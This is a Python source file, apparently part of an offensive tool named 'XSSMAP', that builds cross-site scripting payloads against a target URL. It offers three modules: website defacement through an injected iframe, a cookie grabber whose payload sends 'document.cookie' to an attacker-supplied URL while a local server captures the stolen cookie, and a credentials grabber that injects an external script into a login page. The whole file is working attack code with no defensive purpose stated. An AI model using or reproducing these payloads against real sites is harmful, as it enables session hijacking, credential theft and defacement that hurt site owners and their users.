import base64
import subprocess
import requests
from requests_html import HTMLSession
import urllib.parse
import signal
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import time
def interaction(url):
    print("[\033[94mINF\033[0m] Loading Exploitation modules  (\033[92m...\033[0m)")
    print("[\033[94mINF\033[0m] Please choose one of the following options (\033[92m1\033[0m,\033[92m2\033[0m or \033[92m3\033[0m)")
    print("[\033[94mINF\033[0m] \033[92m1.\033[0m Defacing a website")
    print("[\033[94mINF\033[0m] \033[92m2.\033[0m Cookie graber")
    print("[\033[94mINF\033[0m] \033[92m3.\033[0m Credentials graber")
    choice = input("\033[92mXSSMAP >\033[0m ")
    while choice == '1' or choice == '2' or choice == '3':

        if choice == '1':
            print("[\033[94mINF\033[0m] Loading Defacing Module (option 1)")
            deface(url)
            choice = input("Enter your choice (1, 2, 3 or exit): ")
        elif choice == '2':
            print("[\033[94mINF\033[0m] Loading Cookie graber Module (option 2)")
            cookie_graber(url)
            choice = input("Enter your choice (1, 2, 3 or exit): ")
        elif choice == '3':
            print("[\033[94mINF\033[0m] Loading Credential graber module (option 3)")
            credentials_graber(url)
        else:
            exit()

def deface(i):
    def upload_file(file_path):
        url = 'http://localhost:9999'
        filename = os.path.basename(file_path)
        with open(file_path, 'rb') as file:
            headers = {'Filename': filename}
            response = requests.post(url, data=file, headers=headers)
        print(response.text)

    print("[\033[94mINF\033[0m] Give path to your html deface file:")
    xss_path=input("\033[92mXSSMAP >\033[0m ")
    upload_file(xss_path)
    payload= f'"</p><iframe src=http://localhost:9999/{xss_path}>'

    # URL-encode the payload
    encoded_payload = urllib.parse.quote(payload)

    # Construct the full URL
    full_url = f"{i}{encoded_payload}"

    print(full_url)

class CookieHandler(BaseHTTPRequestHandler):
    first_cookie_received = False

    def do_GET(self):
        if not CookieHandler.first_cookie_received:
            cookie = self.path.split("?cookie=")[-1]
            print("\n\033[33mCookie revealed: \033[0m", cookie)
            CookieHandler.first_cookie_received = True
            self.server.shutdown()  # Shutdown the server
        self.send_response(200)
        self.end_headers()

def run_server(server_class=HTTPServer, handler_class=CookieHandler, port=9998):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Serving at port {port}')
    httpd.serve_forever()

def cookie_graber(url):
    attacker_url = input("give me the attacker_url : ")
    # URL to test
    payload = f'</p><img src=x onerror=this.src="{attacker_url}?cookie="+document.cookie;>'
    print(payload)
    # URL-encode the payload
    encoded_payload = urllib.parse.quote(payload)
    print(encoded_payload)

    # Start the server in a new process
    from multiprocessing import Process
    server_process = Process(target=run_server)
    server_process.start()

    time.sleep(1)
    print("\033[92mThe cookie will pop up any time stay focused :) \033[0m")
def credentials_graber(url):
    url = input("give me a login page to attack : ")
    payload= f'{url}?message=<script src=CC/cred.js></script>'
    encoded_payload = urllib.parse.quote(payload)
    print(encoded_payload)

